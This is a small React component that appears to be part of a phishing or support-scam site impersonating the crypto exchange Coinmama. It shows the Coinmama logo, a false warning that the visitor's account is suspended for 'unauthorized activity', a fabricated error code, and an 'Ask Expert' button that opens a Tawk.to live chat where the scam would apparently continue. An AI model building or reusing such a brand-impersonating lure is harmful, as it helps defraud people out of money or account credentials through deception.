import React from "react";

const Verify = () => {
  const openChat = () => {
    if (window.Tawk_API && window.Tawk_API.maximize) {
      window.Tawk_API.maximize(); // Open the Tawk.to chat widget
    } else {
      alert("Please wait...");
    }
  };

  return (
    <div className="bg-blue-400 min-h-screen flex justify-center items-center p-4 sm:p-6">
      <div className="w-full max-w-lg sm:max-w-xl bg-white rounded-lg shadow-md border-2">
        {/* Header Image */}
        <div className=" flex justify-center py-4">
        <img src={require('../Images/coinmama-logo.webp')} alt="Navigation" className="w-36" />

        </div>

        {/* Alert Message */}
        <div className=" text-center px-4 sm:px-8 py-6">
          <h1 className="text-red-500 text-2xl sm:text-3xl md:text-4xl font-bold mb-4">
            Important Message
          </h1>
          <p className="text-gray-700 text-sm sm:text-base md:text-lg leading-relaxed mb-6">
            Due to unauthorized activity and identification failure on your
            Account, access has been suspended. Please get in touch with our
            Support Staff immediately.
          </p>
          <p className="font-bold text-gray-800 text-sm sm:text-base md:text-lg">
            Error CODE: EBRX16X76D
          </p>
        </div>

        {/* Action Button */}
        <div className="flex justify-center pb-6">
          <button
            className="px-6 py-3 bg-blue-700 text-white text-sm sm:text-base rounded-lg hover:bg-blue-800 transition"
            onClick={openChat}
          >
            Ask Expert
          </button>
        </div>
      </div>
    </div>
  );
};

export default Verify;
